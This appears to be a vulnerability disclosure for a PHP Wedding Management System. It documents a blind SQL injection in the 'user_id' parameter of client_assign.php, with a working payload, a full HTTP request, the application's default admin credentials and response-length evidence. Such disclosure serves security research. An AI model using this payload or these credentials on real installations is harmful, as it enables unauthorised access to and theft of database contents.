# WeddingManagement System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/admin/client_assign.php?booking=31&user_id=

Vulnerability location: /Wedding-Management/admin/client_assign.php?booking=31&user_id=,id

[+] Payload: /Wedding-Management/admin/client_assign.php?booking=31&user_id=31%20and%20length(database())%20=8 // Leak place ---> user_id

Current database name: dbwedding,length is 9

```sql
GET /Wedding-Management/admin/client_assign.php?booking=31&user_id=31%20and%20length(database())%20=8 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 8, Content-Length: 16359

![image](https://user-images.githubusercontent.com/54017627/167991710-c2539421-48e5-4028-8919-3b745591968e.png)

![image](https://user-images.githubusercontent.com/54017627/167991778-7e5b33a1-feea-48b9-a045-decc7adb9e1b.png)

When length (database ()) = 9, Content-Length: 15082

![image](https://user-images.githubusercontent.com/54017627/167991735-21cabfc8-1029-48d1-a990-fa00cf5974bd.png)

![image](https://user-images.githubusercontent.com/54017627/167991643-7d2f0810-02af-4c12-8441-1dfebaa882d5.png)
